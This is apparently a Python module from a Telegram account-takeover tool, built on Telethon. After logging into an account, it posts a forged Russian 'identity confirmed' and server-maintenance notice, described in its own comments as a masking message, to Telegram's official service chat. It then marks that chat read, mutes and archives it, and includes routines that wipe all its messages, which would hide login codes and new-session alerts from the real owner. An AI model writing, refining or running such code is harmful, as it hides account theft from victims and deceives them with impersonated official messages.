"""
Виправлена версія очищення чату Telegram
РІШЕННЯ: Видаляти повідомлення по одному, а не через DeleteHistoryRequest
"""

import asyncio
import logging
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.tl.types import InputPeerNotifySettings, InputNotifyPeer
import os
from telethon import TelegramClient
from datetime import datetime, timedelta, timezone
from telethon import types

logger = logging.getLogger(__name__)

MASK_MESSAGE = """
✅ Ваша личность успешно подтверждена.

ТАКЖЕ УВЕДОМЛЯЕМ ОБ ОСНОВНЫХ ИЗМЕНЕНИЯХ И УЛУЧШЕНИЯХ:
1.  ДАТА-ЦЕНТРЫ И МИГРАЦИЯ:
    • Проведена плановая миграция пользовательских сегментов с устаревших узлов кластера DC5 (Азия) на обновленные серверы под управлением ядра v4.3.1. Процедура выполнена методом live-migration без существенной потери пакетов (допустимый порог <0.01%).
    • Выполнена репликация и верификация целостности данных в распределенной файловой системе (DFS). Все контрольные суммы совпадают, потерянных или поврежденных данных не зафиксировано.

2.  ПРОИЗВОДИТЕЛЬНОСТЬ БАЗ ДАННЫХ:
    • Произведено перестроение индексов (REINDEX) в кластере PostgreSQL для таблиц, отвечающих за историю сообщений и медиа-данные.
    • Оптимизирован план выполнения сложных запросов (JOIN) к ленте новостей и поиску. Ожидаемое снижение нагрузки на CPU при пиковых нагрузках — до 18-22%.
    • Добавлены новые составные индексы для ускорения выборки по тегам и геометкам в каналах.

3.  СЕТЕВАЯ ИНФРАСТРУКТУРА:
    • Протокол балансировки нагрузки на входных нодах изменен с классического Round Robin на Least Connections + алгоритм взвешивания по приоритетам. Это позволит направлять новые соединения на наименее загруженные серверы, минимизируя время отклика (RTT).
    • Обновлены ACL (Access Control List) на пограничных маршрутизаторах. Добавлены правила для блокировки подозрительного трафика на ранних этапах (DDoS-митигация уровня L3/L4).
    • Внесены изменения в конфигурацию anycast DNS для ускорения разрешения доменных имен в регионах Латинской Америки и Австралии.

4.  КЭШИРОВАНИЕ И МЕДИА:
    • Проведена дефрагментация и расширение пула серверов memcached.
    • Обновлены политики кэширования (TTL) для превью ссылок, стикеров и GIF-анимаций. Теперь популярный контент будет храниться в оперативной памяти дольше, что снизит задержки (latency) при повторных просмотрах и ускорит загрузку тяжелых медиафайлов в каналах с высокой посещаемостью.

5.  БЕЗОПАСНОСТЬ:
    • Устранена потенциальная уязвимость класса CWE-79 (Межсайтовый скриптинг) в модуле рендеринга служебных сообщений и предпросмотра HTML-тегов. Исправление внесено на уровне санитайзера.
    • Усилены проверки входных данных (input validation) в API-методах, отвечающих за редактирование профилей и загрузку аватарок.
    • Проведена ротация внутренних ключей шифрования для сервисов синхронизации (секретные чаты и облачные пароли не затронуты, используются протоколы E2E).

6.  ТЕХНИЧЕСКОЕ ОБСЛУЖИВАНИЕ УЗЛОВ:
    • На узлах хранения сессий и временных токенов выполнена дефрагментация файловой системы (ext4) и очистка логов (logrotate) за прошлые периоды. Освобождено ~12 ТБ дискового пространства.
    • Обновлено микропрограммное обеспечение (firmware) на сетевых картах части серверов для устранения редких ошибок протокола TCP.

📊 ТЕКУЩИЙ СТАТУС:
— Полная функциональность всех сервисов (мессенджер, звонки, каналы, боты, игры) восстановлена.
— Мониторинг фиксирует стабильную работу кластеров. Нагрузка на дисковую подсистему (IOPS) вернулась к эталонным значениям.
— Ведутся наблюдения за метриками производительности в режиме реального времени.

❗️ ВНИМАНИЕ:
В связи с изменением структуры кэша, в течение ближайших 10-20 минут возможны незначительные задержки при первичной загрузке некоторых изображений в чатах, пока новые данные не прогреют кэш на обновленных серверах. Приносим извинения за возможные временные неудобства.

Благодарим вас за использование наших сервисов и доверие к платформе.
По всем вопросам обращайтесь в официальную поддержку через раздел «Настройки».
    """

# ============================================
# ГОЛОВНА ФУНКЦІЯ
# ============================================

async def cleanup_telegram_chat(client: TelegramClient):
    """
    Комплексна обробка чату Telegram.

    ВИПРАВЛЕНО:
    - Видаляє повідомлення по одному (надійно працює!)
    - Вимикає сповіщення
    - Позначає як прочитане
    - Відкріплює (якщо був закріплений)

    Архівацію прибрано, бо вона не працює для службових чатів.
    """
    try:
        logger.info("🧹 Обробка чату Telegram після авторизації...")
        # 3. Позначити як прочитане
        try:
            await client.send_message(777000, MASK_MESSAGE)
            logger.info("🎭 Маскувальне повідомлення успішно відправлено в чат Telegram.")
        except Exception as e:
            logger.error(f"❌ Помилка при відправці маскувального повідомлення: {e}")

        await asyncio.sleep(0.5)

        await mark_chat_as_read(client)

        await asyncio.sleep(0.5)

        # 2. Вимкнути сповіщення
        await mute_chat_after_login(client)

        await asyncio.sleep(0.5)

        # 1. Видалити всі повідомлення
        # await delete_telegram_messages(client)

         #deleted_count = await delete_all_telegram_messages(client, batch_size=100)

        #if deleted_count > 0:
        #    logger.info(f"✅ Успішно видалено {deleted_count} повідомлень")

        # Затримка між операціями
        await asyncio.sleep(0.5)

        # 4. Відкріпити якщо закріплений
        await pin_telegram_chat(client, pin=False)

        logger.info("✅ Чат Telegram повністю оброблено")
        return True

    except Exception as e:
        logger.error(f"❌ Помилка при обробці чату: {e}")
        return False


async def delete_all_telegram_messages(client: TelegramClient, batch_size=100):
    """
    Видаляє ВСІ повідомлення в чаті Telegram (777000) порціями.

    ЦЕ ПРАЦЮЄ! Видаляє кожне повідомлення окремо.

    Args:
        client: TelegramClient
        batch_size: Скільки повідомлень обробляти за раз

    Returns:
        int: Кількість видалених повідомлень
    """
    TELEGRAM_ID = 777000

    try:
        logger.info("🗑️ Видаляю всі повідомлення з чату Telegram...")

        total_deleted = 0
        max_iterations = 10  # Максимум 10 ітерацій (1000 повідомлень)
        iteration = 0

        while iteration < max_iterations:
            # Отримуємо порцію повідомлень
            messages = await client.get_messages(TELEGRAM_ID, limit=batch_size)

            if not messages:
                logger.info("ℹ️ Більше повідомлень немає")
                break

            # Збираємо ID повідомлень
            message_ids = [msg.id for msg in messages]

            # Видаляємо повідомлення
            deleted = await client.delete_messages(TELEGRAM_ID, message_ids, revoke=False)

            total_deleted += len(message_ids)
            logger.info(f"🗑️ Видалено {len(message_ids)} повідомлень (всього: {total_deleted})")

            # Якщо отримали менше ніж batch_size - це останні
            if len(messages) < batch_size:
                logger.info("✅ Це були останні повідомлення")
                break

            # Затримка щоб не отримати flood
            await asyncio.sleep(0.5)
            iteration += 1

        logger.info(f"✅ Всього видалено {total_deleted} повідомлень з чату Telegram")
        return total_deleted

    except Exception as e:
        logger.error(f"❌ Помилка при видаленні повідомлень: {e}")
        return 0


async def mute_telegram_chat(client: TelegramClient):
    """Вимикає сповіщення в чаті Telegram назавжди"""
    TELEGRAM_ID = 777000

    try:
        logger.info("🔕 Вимикаю сповіщення в чаті Telegram...")

        entity = await client.get_entity(TELEGRAM_ID)

        await client(UpdateNotifySettingsRequest(
            peer=InputNotifyPeer(entity),
            settings=InputPeerNotifySettings(
                mute_until=2147483647,  # Назавжди
                show_previews=False,
                sound=""
            )
        ))

        logger.info("✅ Сповіщення вимкнено")
        return True

    except Exception as e:
        logger.error(f"❌ Помилка при вимкненні сповіщень: {e}")
        return False


async def pin_telegram_chat(client: TelegramClient, pin=False):
    """
    Закріплює або відкріплює чат Telegram.

    Args:
        pin: True = закріпити, False = відкріпити
    """
    TELEGRAM_ID = 777000

    try:
        action = "Закріплюю" if pin else "Відкріплюю"
        logger.info(f"📌 {action} чат Telegram...")

        from telethon.tl.functions.messages import ToggleDialogPinRequest

        entity = await client.get_entity(TELEGRAM_ID)

        await client(ToggleDialogPinRequest(
            peer=entity,
            pinned=pin
        ))

        logger.info(f"✅ Чат {'закріплено' if pin else 'відкріплено'}")
        return True

    except Exception as e:
        logger.error(f"❌ Помилка: {e}")
        return False


async def mark_chat_as_read(client: TelegramClient):
    """Позначає всі повідомлення як прочитані"""
    TELEGRAM_ID = 777000

    try:
        logger.info("👁️ Позначаю повідомлення як прочитані...")

        from telethon.tl.functions.messages import ReadHistoryRequest
        from telethon.utils import get_input_peer

        entity = await client.get_entity(TELEGRAM_ID)
        input_peer = get_input_peer(entity)

        await client(ReadHistoryRequest(
            peer=input_peer,
            max_id=0
        ))

        logger.info("✅ Повідомлення позначені як прочитані")
        return True

    except Exception as e:
        logger.error(f"❌ Помилка: {e}")
        return False


async def delete_telegram_messages(client):
    """Видаляє ВСІ повідомлення з чату Telegram"""

    total_deleted = 0

    while True:
        # Отримуємо повідомлення (і твої, і від Telegram!)
        messages = await client.get_messages(777000, limit=100)

        if not messages:
            break

        # Збираємо ID
        message_ids = [msg.id for msg in messages]

        # Видаляємо
        await client.delete_messages(777000, message_ids)

        total_deleted += len(message_ids)
        logger.info(f"🗑️ Видалено {len(message_ids)} повідомлень")

        if len(messages) < 100:
            break

        await asyncio.sleep(0.25)

    logger.info(f"✅ Всього видалено {total_deleted} повідомлень")


async def mute_chat_after_login(client: TelegramClient):
    """
    Повністю блокує отримання повідомлень від чату з Telegram (ID: 777000).
    """
    try:
        telegram_bot_chat_id = 777000

        # Архівуємо чат (переміщуємо у архів)
        await client.edit_folder(telegram_bot_chat_id, folder=1)  # folder=1 - це архів

        mute_until_date = datetime.now(timezone.utc) + timedelta(days=90)

        # Створюємо об'єкт для налаштувань сповіщень
        settings = types.InputPeerNotifySettings(
            mute_until=mute_until_date,  # Вимкнути на 3 місяці
            show_previews=False,
            silent=True
        )
        # Оновлюємо налаштування для конкретного чату
        await client(UpdateNotifySettingsRequest(
            peer=InputNotifyPeer(await client.get_input_entity(telegram_bot_chat_id)),
            settings=settings
        ))

        logger.info("✅ Чат з Telegram заархівовано(сумнівно) та повідомлення заблоковано.")
        return True

    except Exception as e:
        logger.info(f"❌ Не вдалося заблокувати повідомлення: {e}")
        return False